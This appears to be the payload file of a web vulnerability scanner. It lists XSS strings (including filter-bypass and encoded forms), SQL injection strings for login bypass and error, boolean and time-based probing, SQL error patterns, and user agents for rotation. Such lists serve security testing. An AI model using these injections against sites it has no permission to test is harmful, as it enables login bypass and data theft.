"""
Payloads Simples pour Tests
===========================
"""

PAYLOADS = {
    "xss": {
        "simple": [
            "<script>alert('XSS')</script>",
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg/onload=alert(1)>",
            "javascript:alert(1)"
        ],
        "filtered": [
            "<scr<script>ipt>alert(1)</script>",
            "\" onmouseover=\"alert(1)",
            "' onmouseover='alert(1)",
            "><script>alert(1)</script>",
            "<img src=x onerror=alert(1)//"
        ],
        "encoded": [
            "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
            "&lt;script&gt;alert(1)&lt;/script&gt;",
            "%22%20onmouseover%3D%22alert(1)",
            "\\x3Cscript\\x3Ealert(1)\\x3C/script\\x3E"
        ]
    },
    "sqli": {
        "auth_bypass": [
            "' OR '1'='1",
            "' OR 1=1 --",
            "admin' --",
            "admin' #",
            "' OR '1'='1' --",
            "' OR '1'='1' /*"
        ],
        "error_based": [
            "'",
            "\"",
            "';",
            "')",
            "'))"
        ],
        "boolean_based": [
            "' AND 1=1 --",
            "' AND 1=2 --",
            "1' AND 1=1 --",
            "1' AND 1=2 --"
        ],
        "time_based": [
            "' WAITFOR DELAY '0:0:5' --",
            "'; SLEEP(5) --",
            "1' AND SLEEP(5) --",
            "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a) --"
        ]
    }
}

# Compatibility Mapping for Scanner
XSS_PAYLOADS = PAYLOADS["xss"]["simple"]
ADVANCED_XSS_PAYLOADS = PAYLOADS["xss"]["filtered"] + PAYLOADS["xss"]["encoded"]

SQLI_PAYLOADS = PAYLOADS["sqli"]["error_based"] + PAYLOADS["sqli"]["auth_bypass"]
ADVANCED_SQLI_PAYLOADS = PAYLOADS["sqli"]["boolean_based"] + PAYLOADS["sqli"]["time_based"]

# Patterns d'erreurs SQL
SQL_ERROR_PATTERNS = [
    "SQL syntax",
    "mysql",
    "PostgreSQL",
    "sqlite",
    "ORA-",
    "Microsoft SQL"
]

# User Agents for Rotation
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.59"
]
